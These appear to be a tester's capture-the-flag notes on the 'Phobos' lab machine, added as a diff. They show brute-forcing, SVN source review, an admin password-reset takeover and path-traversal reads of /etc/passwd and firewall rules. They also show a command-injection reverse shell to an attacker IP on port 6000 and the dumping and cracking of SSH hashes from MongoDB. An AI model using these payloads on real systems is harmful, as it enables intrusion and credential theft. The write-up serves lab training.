@@ -1,0 +1,382 @@
+Foothold:
+
+only port 80 opened, so you know exploit is there
+
+gobusting reveals /svn and /internal
+
+/internal is forbidden
+
+/svn has basic auth
+
+givine right or wrong credentials results in error page (tricky)
+
+use hydra to "verify" that correct creds are admin:admin
+
+http://tylerrockwell.github.io/defeating-basic-auth-with-hydra/
+
+remember to gobust SUBDIRECTORIES ;)
+
+reveals /svn/dev
+
+from /svn guess that it is a svn repository. manage.py also indicates that it is a django application
+
+According to the directory listing above, the repository is currently running Revision 3. Next, we'll review this repo's log.
+
+┌──(kali㉿kali)-[~]
+└─$ svn log --username admin --password admin http://192.168.120.73/svn/dev/
+------------------------------------------------------------------------
+r3 | admin | 2021-01-26 10:26:06 -0500 (Tue, 26 Jan 2021) | 1 line
+
+
+------------------------------------------------------------------------
+r2 | admin | 2021-01-26 10:25:43 -0500 (Tue, 26 Jan 2021) | 1 line
+
+Commit 2
+------------------------------------------------------------------------
+r1 | admin | 2021-01-26 10:25:37 -0500 (Tue, 26 Jan 2021) | 1 line
+
+
+compare commit 2 & 3 to get interesting results :)
+
+┌──(kali㉿kali)-[~]
+└─$ svn diff -r 3:2 --username admin --password admin http://192.168.120.73/svn/dev/
+Index: todo
+===================================================================
+--- todo        (nonexistent)
++++ todo        (revision 2)
+@@ -0,0 +1,5 @@
++*Change this application to a this virtual host internal-phobos.phobos.offsec
++*Randomise the secret key
++* Make a database for maintaining employee ssh credentials
++* Move the entire site to a docker container
++* Configure the ufw firewall
+
+
+-> virtual host
+
+-> database has ssh credentials
+
+-> firewall
+
+set /etc/host file to http://internal-phobos.phobos.offsec, we are redirected to the application's login page.
+
+can't bruteforce/do a password reset hence dirbust the directories!
+
+┌──(kali㉿kali)-[~]
+└─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://internal-phobos.phobos.offsec/
+===============================================================
+Gobuster v3.0.1
+...
+/account (Status: 301)
+/home (Status: 301)
+/jobs (Status: 302)
+/login (Status: 301)
+/logout (Status: 301)
+/register (Status: 301)
+/server-status (Status: 403)
+/static (Status: 301)
+/submissions (Status: 301)
+/svn (Status: 401)
+...
+
+go to /register and create new account
+
+try and change account password
+
+POST /account/ HTTP/1.1
+Host: internal-phobos.phobos.offsec
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://internal-phobos.phobos.offsec/account/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 151
+Origin: http://internal-phobos.phobos.offsec
+Connection: close
+Cookie: csrftoken=L1NGgiissDaqm9NnivIJLA7MUlsDxn9XFhdHAMKkOTLKpjtI8fdRXCAO25vof8na; sessionid=1nwycjh91psw4iiobeh666t9dx5ynseg
+Upgrade-Insecure-Requests: 1
+
+csrfmiddlewaretoken=BKuknVDPRt68HkjhVdyGxfX6zrMdcH6Av0UlHp5HdJHsKuZCLX3OJhq8HbPYUskN&oldpass=pass12345&newpass=pass123&cnewpass=pass123&username=hacker
+
+Aside from the anti-CSRF token, we the following fields are sent to the server:
+
+oldpass: pass12345
+newpass: pass123
+cnewpass: pass123
+username: hacker
+
+source code analysis to see how this reset password works
+
+┌──(kali㉿kali)-[~]
+└─$ curl http://192.168.120.73/svn/dev/users/views.py -u "admin:admin" --output views.py
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  2997  100  2997    0     0  42814      0 --:--:-- --:--:-- --:--:-- 42814
+
+┌──(kali㉿kali)-[~]
+└─$ grep "account" views.py -m 1 -A 13 -n
+40:def account(request):
+41-    form=Passwordresetform()
+42-    context={'form':form}
+43-    if(request.method=="POST"):
+44-        form=Passwordresetform(request.POST)
+45-        if(form.is_valid()):
+46-            print(form.cleaned_data.get('username'))
+47-            user=User.objects.get(username=request.POST['username'])
+48-            if(form.cleaned_data.get('newpass')==form.cleaned_data.get('cnewpass')):
+49-                user.set_password(form.cleaned_data.get('newpass'))
+50-                user.save()
+51-                messages.success(request,message='Password successfully changed')
+52-                return redirect('home')
+53-    return render(request,template_name='account.html',context=context)
+
+set username to admin to reset admin username
+
+POST /account/ HTTP/1.1
+Host: internal-phobos.phobos.offsec
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://internal-phobos.phobos.offsec/account/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 144
+Origin: http://internal-phobos.phobos.offsec
+Connection: close
+Cookie: csrftoken=L1NGgiissDaqm9NnivIJLA7MUlsDxn9XFhdHAMKkOTLKpjtI8fdRXCAO25vof8na; sessionid=1nwycjh91psw4iiobeh666t9dx5ynseg
+Upgrade-Insecure-Requests: 1
+
+csrfmiddlewaretoken=bXqM3Br48tjVzjShdiCNvs1WTwc1RYUn5dQNn5TWuJUfCtyC327VHuuY1gfMzJ8A&oldpass=secret&newpass=pwned&cnewpass=pwned&username=admin
+
+go to /submissions page, now as admin, we can review submitted pages before choosing to delete them
+
+search for the function that handles this page. We find the function remove_view_submissions in users/views.py:
+
+┌──(kali㉿kali)-[~]
+└─$ grep "remove_view_submissions" views.py -A 21 -n
+63:def remove_view_submissions(request):
+64-    if(request.method=="POST"):
+65-        action=request.POST["action"]
+66-        if(action=="view"):
+67-            f=request.POST["file"]       
+68-            fil=open('/var/www/html/internal/submissions/'+f,'r')
+69-            print(f)
+70-            output=fil.read()
+71-            return HttpResponse(content=output)
+72-
+73-
+74-        elif(action=="delete"):
+75-            cmd=["rm","/var/www/html/internal/submissions/{}".format(request.POST["file"])]
+76-            cmd="/bin/bash -c 'rm /var/www/html/internal/submissions/{}'".format(request.POST["file"])
+77-            print(cmd)
+78-            a=os.system(cmd)
+79-            messages.info(request,message="The file has been deleted") 
+80-
+81-    files=subprocess.Popen(['ls','/var/www/html/internal/submissions'],stdout=subprocess.PIPE).stdout.read().decode().split('\n')
+82-    print(files)    
+83-    context={"files":files}
+84-    return render(request,template_name='submissions.html',context=context)
+
+possible lfi vulnerability
+
+POST /submissions/ HTTP/1.1
+Host: internal-phobos.phobos.offsec
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://internal-phobos.phobos.offsec/submissions/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 109
+Origin: http://internal-phobos.phobos.offsec
+Connection: close
+Cookie: csrftoken=f1dhvNvpawMFEMSUdIbluQhRgReRtSaygd1jOViyvZolAP1BstR7xTRW58p0PBrW; sessionid=n7snizeq93vhzy9ik4b6de4w0gm5uwiw
+Upgrade-Insecure-Requests: 1
+
+csrfmiddlewaretoken=s9WWtYggEBZepAu2EbmlTceWugndQap6tlKYM63pZ4BUlDDJTW27WfO1jxymcTGu&file=..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&action=view
+
+After we forward it to the server, we receive the contents of the passwd file.
+
+HTTP/1.1 200 OK
+...
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+...
+
+realise that from the source code, rce is possible via command injection
+
+POST /submissions/ HTTP/1.1
+Host: internal-phobos.phobos.offsec
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://internal-phobos.phobos.offsec/submissions/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 186
+Origin: http://internal-phobos.phobos.offsec
+Connection: close
+Cookie: csrftoken=f1dhvNvpawMFEMSUdIbluQhRgReRtSaygd1jOViyvZolAP1BstR7xTRW58p0PBrW; sessionid=n7snizeq93vhzy9ik4b6de4w0gm5uwiw
+Upgrade-Insecure-Requests: 1
+
+csrfmiddlewaretoken=yBNVk9U8uS4uRNwekinLNCMVc4etHSe4zNBXDhHhPlGaNQFVz33xQFm01lpC3Bvs&file=pwn%3becho+%22W00T%22+%3e+%2fvar%2fwww%2fhtml%2finternal%2fsubmissions%2ftest.html&action=delete
+
+
+Use LFI to get firewall rules:
+
+POST /submissions/ HTTP/1.1
+Host: internal-phobos.phobos.offsec
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://internal-phobos.phobos.offsec/submissions/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 135
+Origin: http://internal-phobos.phobos.offsec
+Connection: close
+Cookie: csrftoken=f1dhvNvpawMFEMSUdIbluQhRgReRtSaygd1jOViyvZolAP1BstR7xTRW58p0PBrW; sessionid=n7snizeq93vhzy9ik4b6de4w0gm5uwiw
+Upgrade-Insecure-Requests: 1
+
+csrfmiddlewaretoken=pjyTmSeRkWbjeWviiH9oJ5uytz9A6mfTqvmVF010FpNZaZEZxsPaM84DiQkJs5wh&file=..%2f..%2f..%2f..%2f..%2fetc%2fufw%2fuser.rules&action=view
+
+The server responds with the active firewall rules:
+
+HTTP/1.1 200 OK
+...
+*filter
+:ufw-user-input - [0:0]
+:ufw-user-output - [0:0]
+:ufw-user-forward - [0:0]
+:ufw-before-logging-input - [0:0]
+:ufw-before-logging-output - [0:0]
+:ufw-before-logging-forward - [0:0]
+:ufw-user-logging-input - [0:0]
+:ufw-user-logging-output - [0:0]
+:ufw-user-logging-forward - [0:0]
+:ufw-after-logging-input - [0:0]
+:ufw-after-logging-output - [0:0]
+:ufw-after-logging-forward - [0:0]
+:ufw-logging-deny - [0:0]
+:ufw-logging-allow - [0:0]
+:ufw-user-limit - [0:0]
+:ufw-user-limit-accept - [0:0]
+### RULES ###
+
+### tuple ### allow tcp 80 0.0.0.0/0 any 0.0.0.0/0 in
+-A ufw-user-input -p tcp --dport 80 -j ACCEPT
+
+### tuple ### allow any 27017 127.0.0.1 any 0.0.0.0/0 out
+-A ufw-user-output -p tcp -d 127.0.0.1 --dport 27017 -j ACCEPT
+-A ufw-user-output -p udp -d 127.0.0.1 --dport 27017 -j ACCEPT
+
+### tuple ### allow any 27017 172.17.0.2 any 0.0.0.0/0 out
+-A ufw-user-output -p tcp -d 172.17.0.2 --dport 27017 -j ACCEPT
+-A ufw-user-output -p udp -d 172.17.0.2 --dport 27017 -j ACCEPT
+
+### tuple ### allow tcp 6000:6007 0.0.0.0/0 any 0.0.0.0/0 out
+-A ufw-user-output -p tcp -m multiport --dports 6000:6007 -j ACCEPT
+
+### END RULES ###
+
+### LOGGING ###
+-A ufw-after-logging-input -j LOG --log-prefix "[UFW BLOCK] " -m limit --limit 3/min --limit-burst 10
+-A ufw-after-logging-output -j LOG --log-prefix "[UFW BLOCK] " -m limit --limit 3/min --limit-burst 10
+-A ufw-after-logging-forward -j LOG --log-prefix "[UFW BLOCK] " -m limit --limit 3/min --limit-burst 10
+-I ufw-logging-deny -m conntrack --ctstate INVALID -j RETURN -m limit --limit 3/min --limit-burst 10
+-A ufw-logging-deny -j LOG --log-prefix "[UFW BLOCK] " -m limit --limit 3/min --limit-burst 10
+-A ufw-logging-allow -j LOG --log-prefix "[UFW ALLOW] " -m limit --limit 3/min --limit-burst 10
+### END LOGGING ###
+
+### RATE LIMITING ###
+-A ufw-user-limit -m limit --limit 3/minute -j LOG --log-prefix "[UFW LIMIT BLOCK] "
+-A ufw-user-limit -j REJECT
+-A ufw-user-limit-accept -j ACCEPT
+### END RATE LIMITING ###
+COMMIT
+
+
+All egress traffic is blocked except for TCP ports 6000 through 6007. 
+
+hence set up reverse shell via: sh -i >& /dev/tcp/192.168.118.5/6000 0>&1
+
+POST /submissions/ HTTP/1.1
+Host: internal-phobos.phobos.offsec
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://internal-phobos.phobos.offsec/submissions/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 167
+Origin: http://internal-phobos.phobos.offsec
+Connection: close
+Cookie: csrftoken=f1dhvNvpawMFEMSUdIbluQhRgReRtSaygd1jOViyvZolAP1BstR7xTRW58p0PBrW; sessionid=n7snizeq93vhzy9ik4b6de4w0gm5uwiw
+Upgrade-Insecure-Requests: 1
+
+csrfmiddlewaretoken=3h43xktYzvhRdmvv2YjBE5cApFYQZNNI4tS5Qsg7UYTx9pEchJZnH8MFeW9Zlw46&file=pwn%3bsh+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.118.5%2F6000+0%3E%261&action=delete
+
+Having sent this request to the server, we finally have a reverse shell.
+
+┌──(kali㉿kali)-[~]
+└─$ nc -nlvp 6000            
+listening on [any] 6000 ...
+connect to [192.168.118.5] from (UNKNOWN) [192.168.120.73] 33694
+sh: 0: can't access tty; job control turned off
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+www-data@ubuntu:/$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+
+
+
+
+
+
+privesc:
+
+remember to ssh passwords are stored in mongodb, hence enumerate mongodb using python or using command line
+
+www-data@ubuntu:/$ python3 
+python3
+Python 3.6.9 (default, Oct  8 2020, 12:12:24) 
+[GCC 8.4.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import pymongo    
+import pymongo
+>>> client=pymongo.MongoClient("127.0.0.1",27017)
+client=pymongo.MongoClient("127.0.0.1",27017)
+>>> client.database_names()
+client.database_names()
+['admin', 'config', 'local', 'staffs']
+>>> client.staffs.collection_names()
+client.staffs.collection_names()
+['ssh_login']
+>>> for i in client.staffs.ssh_login.find({}):
+for i in client.staffs.ssh_login.find({}):
+...     print(i)
+    print(i)
+... 
+{'_id': ObjectId('601afd47d871a88acb7ffdcc'), 'name': 'root', 'pw_hash': '5ff837a98703011de7d0a576ca9a84be6f9e4a798329423c8200beabd0f178656591fdac53ff785e71062dd2473d6dc1bb822a7dce1fc626ee44855466f3c8e1', 'role': 'dev'}
+{'_id': ObjectId('601afd47d871a88acb7ffdcd'), 'name': 'carlos', 'pw_hash': '20132c01e17d4267d316fbfd721becd6a2656b061b365a5d76efdefb386d74a489ebe323bb65fecfe7404aef00f574e6fcce668f0f358ea7bc12c9ef25eb7804', 'role': 'manager'}
+{'_id': ObjectId('601afd47d871a88acb7ffdce'), 'name': 'enox', 'pw_hash': '216572a4d605f2805f918ba0d6b1ade045076832d7bb5476d7ede7d9159121b88edb398d28b470df263d8d2a710e86f27f1a27e66137efae46cb47de87916cee', 'role': 'admin'}
+>>> 
+
+
+┌──(kali㉿kali)-[~]
+└─$ hashcat -a 0 -m 1700 hash /usr/share/wordlists/rockyou.txt
+hashcat (v6.1.1) starting...
+...
+Dictionary cache built:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344392
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+* Runtime...: 1 sec
+
+5ff837a98703011de7d0a576ca9a84be6f9e4a798329423c8200beabd0f178656591fdac53ff785e71062dd2473d6dc1bb822a7dce1fc626ee44855466f3c8e1:1oyindamola
